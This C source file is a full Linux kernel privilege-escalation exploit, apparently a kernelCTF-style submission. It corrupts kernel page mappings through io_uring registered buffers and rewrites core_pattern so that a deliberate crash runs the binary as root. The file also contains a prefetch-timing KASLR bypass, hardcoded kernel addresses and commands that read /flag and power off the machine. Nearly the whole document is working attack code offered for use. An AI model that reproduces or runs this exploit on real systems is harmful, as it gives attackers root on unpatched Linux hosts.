#define _GNU_SOURCE
#include <sched.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <err.h>
#include <sys/auxv.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/bpf.h>
#include <sys/sendfile.h>
#include <linux/kcmp.h>  /* Definition of KCMP_* constants */
#include <sys/syscall.h> /* Definition of SYS_* constants */
#include <unistd.h>
#include <assert.h>

size_t core_pattern = 0xffffffff8421b460;
size_t empty_zero_page = 0xffffffff850f1000;
#include "io_uring.h"

#define PAUSE           \
    {                   \
        printf(":");    \
        int x;          \
        read(0, &x, 1); \
    }

#define PAGE_SIZE 0x1000
#define MSG_MSG_SIZE 0x30
#define MSG_MSGSEG_SIZE 0x8

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

pthread_barrier_t barr;
char __attribute__((aligned(0x1000))) buf[0x1000];
char spraydata[0x1000];
int uring_fd;
struct io_uring_buf_ring *ring_buffer;
struct io_uring_buf_reg reg_ring;
int _msqid[0x4000];
int *msqid;
struct
{
    long mtype;
    char mtext[0x2000];
} msg;

#define PIPE_CNT 0x100
static void flush(void *p)
{
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}
static void barrier(void)
{
    int ret = pthread_barrier_wait(&barr);

    assert(!ret || ret == PTHREAD_BARRIER_SERIAL_THREAD);
}
void set_cpu(int i)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    SYSCHK(sched_setaffinity(0, sizeof(mask), &mask));
}

int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
    int memfd = memfd_create("", 0);
    // send our binary to memfd for core_pattern payload
    SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
    // our binary now at file descriptor 666
    dup2(memfd, 666);
    close(memfd);
    while (check_core() == 0)
        sleep(1);
    puts("Root shell !!");
    /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
    *(size_t *)0 = 0;
}
void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];
    SYSCHK(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWIPC));
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

void hexdump(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        printf("%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            printf(" ");
            if ((i + 1) % 16 == 0)
            {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

// in the last loop we only need to increase 0x7ff refcount.
// In total we increase  0x20 * 0x800 - 1 = 0xffff refcount.
int increase_ref_mnts(int last)
{
    struct io_uring_params params = {};
    int dfd[0x800] = {};
    int ufd = SYSCHK(syscall(SYS_io_uring_setup, 1, &params));

    for (int j = 0; j < 0x800 - last; j++)
        dfd[j] = SYSCHK(open("/proc/mounts", 0));

    if (last)
        dfd[0x7ff] = -1;
    // Use io_uring to hold the file's refcount.
    SYSCHK(syscall(__NR_io_uring_register, ufd, IORING_REGISTER_FILES, &dfd, 0x800));
    for (int j = 0; j < 0x800; j++)
        close(dfd[j]);
    return ufd;
}

void free_mntns(int ufd)
{
    int fds[] = {0, 1, 2};
    struct io_uring_rsrc_update2 reg = {

        .data = (size_t)&fds};
    SYSCHK(syscall(__NR_io_uring_register, ufd, IORING_REGISTER_FILES_UPDATE, &reg, 3));
}

size_t *addrs[0x4000];

size_t init_ucounts = 0xffffffff83877660;

size_t _vdso_data = 0xffffffff84255080;
size_t PAGE(size_t addr)
{
    return addr & (~0xfff);
}
int bypass_kaslr(u64 base);

int main(int argc, char **argv)
{

    if (argc == 1)
    {
        if (fork() == 0) // this process is used to trigger core_pattern exploit
        {
            set_cpu(1);
            setsid();
            crash("");
        }
        while (1)
        {

            if (fork() == 0)
            {
                execl("/proc/self/exe", "exe", "c", NULL);
            }
            wait(0);
        }
    }
    if (argc > 1)
    {
        if (strcmp(argv[1], "c") == 0)
        {
            ;
        }
        else
        {
            int pid = strtoull(argv[1], 0, 10);
            int pfd = syscall(SYS_pidfd_open, pid, 0);
            int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
            int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
            int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
            dup2(stdinfd, 0);
            dup2(stdoutfd, 1);
            dup2(stderrfd, 2);
            /* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
            system("cat /flag");
            system("cat /flag");
            system("cat /flag");
            system("cat /flag");
            system("cat /flag");
            system("cat /flag");
            system("cat /flag;echo o>/proc/sysrq-trigger");
        }
    }

    setvbuf(stdout, 0, 2, 0);
    struct rlimit rlim = {
        .rlim_cur = 0x1000,
        .rlim_max = 0x1000};
    SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));
    set_cpu(0);

    int fds[0x100];

    for (int i = 0; i < 0x100; i++)
    {
        struct io_uring_params params = {};
        fds[i] = SYSCHK(syscall(SYS_io_uring_setup, 1, &params));
    }

    struct io_uring_buf_reg reg_ring2 = {
        .flags = IOU_PBUF_RING_MMAP,
        .ring_entries = 0x1,
        .bgid = 1};
    SYSCHK(syscall(__NR_io_uring_register, fds[0], IORING_REGISTER_PBUF_RING, &reg_ring2, 1));
    char *io_addr = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fds[0], IORING_OFF_PBUF_RING + (1 << 16)));
    memset(io_addr, 'a', 0x100);
    SYSCHK(mmap(io_addr - 0x3000, 0x3000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

    struct iovec iov0 = {.iov_base = (void *)io_addr - 0x3000, .iov_len = 0x4000};

    for (int i = 0; i < 0x100; i++)
    {
        SYSCHK(syscall(__NR_io_uring_register, fds[i], IORING_REGISTER_BUFFERS, &iov0, 1));
    }

    struct io_uring_params params = {}; //{.flags = IORING_SETUP_TASKRUN_FLAG | IORING_SETUP_DEFER_TASKRUN | IORING_SETUP_SINGLE_ISSUER};
    uring_fd = SYSCHK(syscall(SYS_io_uring_setup, 0x8000, &params));
    unsigned char *sq_ring = SYSCHK(mmap(NULL, params.sq_off.array + params.sq_entries * sizeof(unsigned), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
    unsigned char *cq_ring = SYSCHK(mmap(NULL, params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
    struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, params.sq_entries * sizeof(struct io_uring_sqe), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));
    unsigned int *cq_khead = (unsigned int *)(cq_ring + params.cq_off.head);

    int cfd[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cfd));

    struct io_uring_buf_reg reg_ring = {
        .flags = IOU_PBUF_RING_MMAP,
        .ring_entries = 0x200,
        .bgid = 1};
    SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PBUF_RING, &reg_ring, 1));
    char *addr = SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    char *addr2 = SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    char *addr3 = SYSCHK(mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING + (1 << 16)));
    printf("%p %p %p\n", addr, addr2, addr3);
    size_t addr3_addr = (size_t)addr3;
    if ((addr3_addr & 0x1fff) == 0)
        exit(0);

    struct iovec iov = {.iov_base = addr3, .iov_len = 0x6000};

    for (int i = 0; i < 0x100; i++)
        SYSCHK(syscall(__NR_io_uring_register, fds[i], IORING_UNREGISTER_BUFFERS, NULL, 0));
    SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_BUFFERS, &iov, 1));
    SYSCHK(munmap(io_addr, 0x1000));

    for (int i = 0; i < 0x2000; i++)
        addrs[i] = mmap((void *)(0x200000UL * i + 0x40000000), 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);

    for (int i = 0; i < 0x100; i++)
        close(fds[i]);

    size_t sum = 0;
    for (int i = 0; i < 0x2000; i++)
        sum += addrs[i][0];

    printf("%ld\n", sum);
    sqes[0] = (struct io_uring_sqe){
        .opcode = IORING_OP_WRITE_FIXED,
        .fd = cfd[1],
        .addr = (size_t)addr + 0x1000,
        .len = 0x1000,

    };
    sqes[1] = (struct io_uring_sqe){
        .opcode = IORING_OP_READ_FIXED,
        .fd = cfd[1],
        .addr = (size_t)addr + 0x1000,
        .len = 0x1000,

    };

    ((int *)(sq_ring + params.sq_off.array))[1] = 1;
    (*(int *)(sq_ring + params.sq_off.tail)) += 2;

    SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0));
    read(cfd[0], buf, 0x1000);
    hexdump(buf, 0x10);
    if (buf[0] != 0x25)
        exit(0);

    size_t *p = (void *)buf;
    p[0] = p[0] & (~0xfff);
    p[0] = p[0] | 0x367;
    p[0] -= (empty_zero_page - (core_pattern & (~0xfff)));
    write(cfd[0], buf, 0x1000);
    SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0));

    for (int i = 0; i < 0x2000; i++)
        strcpy((void *)(&addrs[i][(core_pattern & 0xfff) / 8]), "|/proc/%P/fd/666 %P");
    while(1) sleep(1);

    exit(0);
}
inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
    uint64_t a, d;
    asm volatile("mfence\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
    uint64_t a, d;
    asm volatile(
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r"(d), "=r"(a)
        :
        : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

void prefetch(void *p)
{
    asm volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        : : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}
int bypass_kaslr(u64 base)
{
    if (!base)
    {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
        while (1)
        {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
                {
                    if (times[ti] < minv)
                    {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0)
                {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                base -= OFFSET;
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

        while (1)
        {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
            {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++)
                {
                    for (int ti = 0; ti < ARRAY_LEN(times); ti++)
                    {
                        u64 addr = addrs[ti];
                        size_t t = flushandreload((void *)addr);
                        if (t < times[ti])
                        {
                            times[ti] = t;
                        }
                    }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
                {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++)
                    {
                        sum += times[ti + i];
                    }
                    if (sum > max)
                    {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (c == 0)
                {
                    base = bases[i];
                }
                else if (base == bases[i])
                {
                    c++;
                }
                else
                {
                    c--;
                }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++)
            {
                if (base == bases[i])
                {
                    c++;
                }
            }
            if (c > ARRAY_LEN(bases) / 2)
            {
                goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
#endif
    }

got_base:
#ifdef KASLR_BYPASS_INTEL
    base -= 0x1000000;
#endif

    printf("using kernel base %llx\n", base);

    return base;
}
